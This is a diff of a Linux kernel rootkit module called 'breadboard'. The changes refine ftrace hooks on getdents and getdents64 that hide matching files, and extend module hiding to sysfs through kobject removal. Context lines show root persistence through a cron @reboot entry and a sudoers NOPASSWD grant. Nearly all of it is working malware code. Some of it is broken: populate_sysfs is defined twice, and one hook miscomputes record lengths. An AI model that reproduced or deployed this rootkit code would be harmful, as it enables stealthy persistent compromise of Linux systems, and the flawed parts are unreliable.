@@ -1,7 +1,8 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
-#include <linux/gpio.h>
+#include <linux/kobject.h>
+//#include <linux/gpio.h>
 #include <linux/kallsyms.h>
 #include <linux/syscalls.h>
 #include <linux/version.h>
@@ -16,7 +17,6 @@
 #define MODULE_PATH BASE_DIR "load_mod.sh"
 #define CRON_CONTENT "@reboot root " MODULE_PATH "\n"
 #define PREFIX "breadboard"
-#define PREFIX_LEN (sizeof(PREFIX) - 1)
 #define SUDO_CONTENT USER_NAME " ALL=(ALL) NOPASSWD: " MODULE_PATH "\n"
 
 static short mod_hidden = 0;
@@ -53,87 +53,86 @@ asmlinkage int hook_kill(const struct pt_regs *regs){
 
 asmlinkage int hook_getdents64(const struct pt_regs *regs){
 	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
-	struct linux_dirent64 *current_dir, *dirent_ker, *prev_dir = NULL;
+	struct linux_dirent64 *current_dir = NULL;
+	struct linux_dirent64 *dirent_ker = NULL;
+	struct linux_dirent64 *prev_dir = NULL;
 	unsigned long offset = 0;
 	long error;
-	int ret;
+	long ret;
 	
-	//printk(KERN_INFO "Inside hook_getdents64\n");
+	
+	// Call original getdents so we can modify the result
 	ret = orig_getdents64(regs);
 	if (ret <= 0){
 		return ret;
 	}
-	dirent_ker = kzalloc(ret, GFP_KERNEL);
+	// allocate memory in kernel space for the directory entries
+	dirent_ker = kmalloc(ret, GFP_KERNEL);
 	if (dirent_ker == NULL){
-		return ret;
+		return -ENOMEM;
 	}
+	//copy directories from user space to kernel space
 	error = copy_from_user(dirent_ker, dirent, ret);
 	if (error){
 		//printk(KERN_INFO "Error on copy_from_user.\n");
 		kfree(dirent_ker);
-		return ret;
+		return -EFAULT;
 	}
 	while (offset < ret){
-		current_dir = (void *)dirent_ker + offset;
+		current_dir = (struct linux_dirent64 *)((char *)dirent_ker + offset);
 		//printk(KERN_INFO "current_dir->d_name %s \n", current_dir->d_name);
-		if (memcmp(PREFIX, current_dir->d_name, PREFIX_LEN) == 0){
+		if (strncmp(current_dir->d_name, PREFIX, strlen(PREFIX)) == 0){
 			if (current_dir == dirent_ker){
 				ret -= current_dir->d_reclen;
-				memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
+				memmove(dirent_ker, (char *)dirent_ker + current_dir->d_reclen, ret);
 				continue;
 			}
-			prev_dir->d_reclen += current_dir->d_reclen;
-			//printk(KERN_INFO "Skipped entry.\n");
+			if(prev_dir){
+				prev_dir->d_reclen += current_dir->d_reclen;
+			}
 		}
 		else{
 			prev_dir = current_dir;
 		}
 		offset += current_dir->d_reclen;
 	}
+	//Copy results back to user
 	error = copy_to_user(dirent, dirent_ker, ret);
-	if(error){
-		kfree(dirent_ker);
-	}
 	kfree(dirent_ker);
 	return ret;
 }
 
-struct linux_dirent{
-	unsigned long d_ino;
-	unsigned long d_off;
-	unsigned long d_reclen;
-	char d_name[];
-};
 asmlinkage int hook_getdents(const struct pt_regs *regs){
 	struct linux_dirent __user *dirent = (struct linux_dirent *)regs->si;
 	struct linux_dirent *current_dir, *dirent_ker, *prev_dir = NULL;
 	unsigned long offset = 0;
 	long error;
-	int ret;
+	long ret;
 
 	ret = orig_getdents(regs);
 	if (ret <= 0){
 		return ret;
 	}
-	dirent_ker = kzalloc(ret, GFP_KERNEL);
+	dirent_ker = kmalloc(ret, GFP_KERNEL);
 	if (dirent_ker == NULL){
-		return ret;
+		return -ENOMEM;
 	}
 	error = copy_from_user(dirent_ker, dirent, ret);
 	if (error){
 		kfree(dirent_ker);
-		return ret;
+		return -EFAULT;
 	}
 	while (offset < ret){
-		current_dir = (void *)dirent_ker + offset;
-		if(memcmp(PREFIX, current_dir->d_name, PREFIX_LEN) == 0){
+		current_dir = (struct linux_dirent *)((char *)dirent_ker + offset);
+		if(strncmp(current_dir->d_name, PREFIX, strlen(PREFIX)) == 0){
 			if(current_dir == dirent_ker){
 				ret -= current_dir->d_reclen;
-				memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
+				memmove(dirent_ker, (char *)dirent_ker + current_dir->d_reclen, ret);
 				continue;
 			}
-			prev_dir->d_reclen = current_dir->d_reclen;
-			printk(KERN_INFO "Skipped entry. \n");
+			if(prev_dir){
+				prev_dir->d_reclen = current_dir->d_reclen;
+			}
 		}
 		else {
 			prev_dir = current_dir;
@@ -141,9 +140,6 @@ asmlinkage int hook_getdents(const struct pt_regs *regs){
 		offset += current_dir->d_reclen;
 	}
 	error = copy_to_user(dirent, dirent_ker, ret);
-	if (error){
-		kfree(dirent_ker);
-	}
 	kfree(dirent_ker);
 	return ret;
 }
@@ -216,7 +212,7 @@ static int persistence_removal(void){
 	return ret;
 }
 
-static int privledge(void){
+static int privilege(void){
 	struct file *file;
 	int ret = 0;
 
@@ -240,13 +236,13 @@ static int privledge(void){
 	return 0;
 }
 
-static int privledge_removal(void){
+static int privilege_removal(void){
 	struct file *file;
 	char buf[128];
 	int ret = 0;
 	loff_t pos = 0;
 
-	pr_info("Removing privledge.\n");
+	pr_info("Removing privilege.\n");
 
 	file = filp_open(SUDO_JOB_PATH, O_RDWR, 0644);
 	if (IS_ERR(file)){
@@ -258,7 +254,7 @@ static int privledge_removal(void){
 		if(strstr(buf, SUDO_CONTENT)){
 			file->f_pos = pos - ret;
 			kernel_write(file, "", 0, &file->f_pos);
-			pr_info("Privledge removed.\n");
+			pr_info("Privilege removed.\n");
 			break;
 		}
 	}
@@ -270,14 +266,33 @@ static int privledge_removal(void){
 }
 
 void hide_module(void){
-	prev_module = THIS_MODULE->list.prev;
-	list_del(&THIS_MODULE->list);
-	mod_hidden = 1;
+	if(mod_hidden == 0){
+		prev_module = THIS_MODULE->list.prev;
+		list_del(&THIS_MODULE->list);
+		kobject_del(&THIS_MODULE->mkobj.kobj);
+		kobject_put(&THIS_MODULE->mkobj.kobj);
+		mod_hidden = 1;
+	}
 }
+void populate_sysfs(void){
+	int i;
 
+}
 void show_module(void){
-	list_add(&THIS_MODULE->list, prev_module);
-	mod_hidden = 0;
+	if(mod_hidden == 1){
+		list_add(&THIS_MODULE->list, prev_module);
+		kobject_add(&THIS_MODULE->mkobj.kobj, NULL, "%s", THIS_MODULE->name);
+		populate_sysfs();
+		mod_hidden = 0;
+	}
+}
+static void populate_sysfs(void){
+	int i;
+	THIS_MODULE->holders_dir=kobject_create_and_add("holders", &THIS_MODULE->mkobj.kobj);
+	for (i=0;(THIS_MODULE->modinfo_attrs[i].attr.name) != NULL; i++){
+		if(sysfs_create_file(&THIS_MODULE->mkobj.kobj, &THIS_MODULE->modinfo_attrs[i].attr)!=0)
+			break;
+	}
 }
 
 static struct ftrace_hook hooks[] = {
@@ -301,7 +316,7 @@ static int __init breadboard_init(void){
 		pr_err("Persistance failed\n");
 		return ret;
 	}
-	ret = privledge();
+	ret = privilege();
 	if (ret<0) {
 		pr_err("Privledge failed\n");
 		return ret;
@@ -335,7 +350,7 @@ static void __exit breadboard_exit(void){
 	//gpio_free(GPIO_BUTTON);
 	//show_module();
 	//persistence_removal();
-	//privledge_removal();
+	//privilege_removal();
 }
 
 module_init(breadboard_init);
